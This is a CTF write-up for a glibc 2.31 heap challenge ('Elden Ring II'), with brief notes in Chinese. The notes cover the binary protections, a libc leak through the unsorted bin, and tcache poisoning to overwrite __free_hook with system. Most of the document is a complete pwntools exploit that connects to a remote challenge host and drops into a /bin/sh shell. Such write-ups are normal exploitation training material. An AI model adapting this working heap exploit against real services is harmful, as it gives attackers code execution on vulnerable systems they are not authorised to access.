# Elden Ring II

*write some notes*

## 文件属性

|属性  |值    |
|------|------|
|Arch  |x64   |
|RELRO|Partial|
|Canary|off   |
|NX    |on    |
|PIE   |off   |
|strip |no    |

## 解题思路

> 第二周上来4道堆题

glibc 2.31，有uaf，考虑tcache dup + poisoning  
最大尺寸拿得到unsorted bin，从里面拿到libc，然后打freeHook

要注意的是想tcache dup，需要把`key`写成其他值，此外还要free一个其他堆块放置top chunk合并

## EXPLOIT

```python
from pwn import *
context.terminal = ['tmux','splitw','-h']

def payload(lo:int):
    global sh
    if lo:
        sh = process('./eldering2')
        libc = ELF('/home/Rocket/glibc-all-in-one/libs/2.31-0ubuntu9.12_amd64/libc.so.6')
        if lo & 2:
            gdb.attach(sh)
    else:
        sh = remote('106.14.57.14', 31825)
        libc = ELF('./libc.so.6')
    elf = ELF('eldering')

    def addn(idx:int, size:int):
        sh.sendlineafter(b'>', b'1')
        sh.sendlineafter(b'Index', str(idx).encode())
        sh.sendlineafter(b'Size', str(size).encode())

    def deln(idx:int):
        sh.sendlineafter(b'>', b'2')
        sh.sendlineafter(b'Index', str(idx).encode())

    def edit(idx:int, content:bytes):
        sh.sendlineafter(b'>', b'3')
        sh.sendlineafter(b'Index', str(idx).encode())
        sh.sendafter(b'Content', content)

    def show(idx:int) -> bytes:
        sh.sendlineafter(b'>', b'4')
        sh.sendlineafter(b'Index: ', str(idx).encode())
        return sh.recvline()

    addn(0, 0x98)
    addn(1, 0x98)
    addn(2, 0x98)
    addn(3, 0x98)
    addn(4, 0x98)
    addn(5, 0x98)
    addn(6, 0x98)
    addn(7, 0x98)
    deln(7)
    deln(6)
    deln(5)
    deln(4)
    deln(3)
    deln(2)
    deln(1)
    deln(0) # 1-7 in tcache, 0 in unsorted bin
    ret = show(0)
    
    dumpArena = libc.symbols['__malloc_hook'] + (libc.symbols['__malloc_hook'] - libc.symbols['__realloc_hook']) * 2
    mainArena = u64(ret[:6] + b'\0\0') - 0x60 # sub unsorted bin offset
    libcBase = mainArena - dumpArena
    print(f'\x1b[33mcheck libcBase: {hex(libcBase)}\x1b[0m')
    freeHook = libcBase + libc.symbols['__free_hook']
    system = libcBase + libc.symbols['system']

    addn(8, 0x18)
    addn(9, 0x38) # prevent chunk from being merged into top chunk
    deln(8)
    edit(8, p64(freeHook) + b'\n')
    deln(8) # make 2 bins in tcache
    edit(8, p64(freeHook) + b'\n')
    addn(10, 0x18) # get chunk 8
    addn(11, 0x18) # get freeHook
    edit(11, p64(system) + b'\n')
    edit(9, b'/bin/sh\0\n')
    deln(9)

    sh.clean()
    sh.interactive()
```

